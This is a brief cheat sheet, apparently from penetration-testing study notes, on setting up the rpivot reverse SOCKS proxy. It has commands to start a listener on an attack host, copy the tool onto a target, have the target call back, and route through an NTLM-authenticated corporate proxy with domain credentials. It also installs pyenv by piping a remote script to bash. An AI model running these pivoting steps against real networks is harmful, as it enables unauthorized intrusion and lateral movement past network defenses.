
---
A reverse SOCKS proxy tool written in `Python2.7`, use to create a reverse tunnel.
#### Installation of Python2.7
```bash
curl https://pyenv.run | bash
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(pyenv init -)"' >> ~/.bashrc
source ~/.bashrc
pyenv install 2.7
pyenv shell 2.7
```
#### Cloning rpivot
```bash
git clone https://github.com/klsecservices/rpivot.git
```
### Running Rpivot
#### Attack Host
```bash
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```
#### Transferring rpivot to the Target
```bash
scp -r rpivot [Pivot host name]@[IpaddressOfTarget]:/home/ubuntu/
```
#### Pivot Target
```bash
python2.7 client.py --server-ip [Attack host ip] --server-port 9999
```
#### Using HTTP-Proxy & NTLM Auth
Some organizations have [HTTP-proxy with NTLM authentication](https://docs.microsoft.com/en-us/openspecs/office_protocols/ms-grvhenc/b9e676e7-e787-4020-9840-7cfe7c76044a) configured with the Domain Controller. In such cases, we can provide an additional NTLM authentication option to rpivot to authenticate via the NTLM proxy by providing a username and password.
```bash
python2.7 client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```























